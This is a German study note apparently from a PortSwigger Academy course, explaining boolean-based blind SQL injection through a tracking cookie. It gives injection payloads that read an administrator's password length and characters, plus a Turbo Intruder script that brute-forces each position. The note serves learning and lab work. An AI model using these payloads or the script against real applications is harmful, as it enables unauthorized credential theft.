---
created:
  - "{{date: DD-MM-YYYY}} {{time}}"
aliases:
  - "Course Code:"
  - PSS-Portswigger-Academy
tags:
  - Course/
---
## Was ist Blind SQL Injection

Wenn eine Applikation eine SQL Injection Schwachstelle hat, aber die HTTP Antwort eine andere ist als die relevanten SQL query Details.

In der hinsicht sind Funkionen wie UNION nicht so sinnvoll weil diese aufgrund von Daten die man bekommt zusammengestellt werden.



## Exploiting Blind SQL Injection

Wir gehen davon aus, wir haben einen Cookie welcher Daten für analytische Zwecke abzwackt.
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

Wenn ein Cookie sowas wie TrackingId hat, schau die SQL Query ob der Nutzer bekannt oder unbekannt ist und ruft sowas wie:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
auf.

In diesem Fall werden die Daten nicht zum User returned. 
Allerdings verhält sich die App anders und man hat sowas wie ein "Welcome Back" Abschnitt welcher Zugänge ermöglicht.


#### **Boolean-based**
Man nutzt aus, dass sich die Antwort einer HTTP Anfrage ändert je nachdem ob die eingeschleuse Bedingung in der Datenbank Wahr oder Falsch ist.

Beispiel-Mechanik, vereinfacht:
- Request A enthält eine injizierte Bedingung, die **wahr** ist -> die Seite zeigt z. B. „Welcome back“.
- Request B enthält eine injizierte Bedingung, die **falsch** ist -> „Welcome back“ fehlt.  
    Anhand dieses Unterschieds weißt du, ob die Bedingung true/false ist.

##### Zum Beispiel beim auslesen von Passwörtern - Zeichen für Zeichen

`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')<'m'--`
-> Wenn die Bedingung Wahr ist, wissen wir, dass der erste Buchstabe des Passworts kleiner als 'm' ist. Dann bruteforcen wir den Rest, Zeichen für Zeichen bis das Passwort vollständig rekonstruiert ist.
Auch in diesem Fall nehmen unterschiedliche Datenbanken unterschiedliche Synonyme für den SUBSTRING -> [SQL-Injection-Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

##### Auslesen der Passwortlänge

`' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--`

Mit folgendem Script lässt sich das im Turbo Intruder einsetzen.
Prinzipiell ist es wie bei Intruder die Cluster Bomb mit 2 Paramtern(Numbers, Brute-Froce) - Wir laufen für jede Stelle im Passwort jedes Zeichen aus der Liste ab.
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=False,
        engine=Engine.THREADED
    )

    # Länge des Passworts (Anzahl Iterationen für 'i')
    password_length = 20

    # Zeichenliste (als Liste einzelner Zeichen)
    characters = list("0123456789abcdefghijklmnopqrstuvwxyz")

    # Vorlage-Request (typisch ein String mit PLACEHOLDER1 / PLACEHOLDER2)
    template = target.req

    for i in range(1, password_length + 1):
        for ch in characters:
            # Wandle i in String um und ersetze beide Platzhalter
            req = template.replace("PLACEHOLDER1", str(i)).replace("PLACEHOLDER2", ch)
            # Queue den Request
            engine.queue(req)

    # Wichtig: das Engine-Objekt zurückgeben
    return engine

def handleResponse(req, interesting):
    # 'table' ist in TI normalerweise vorhanden - fügt die Zeile zur UI hinzu
    try:
        table.add(req)
    except Exception:
        # Fallback-Log, falls table nicht verfügbar ist
        print("Error:", req)

```

Lässt sich dann wie folgt einsetzen. ![[sqli_blind_inject1.PNG]]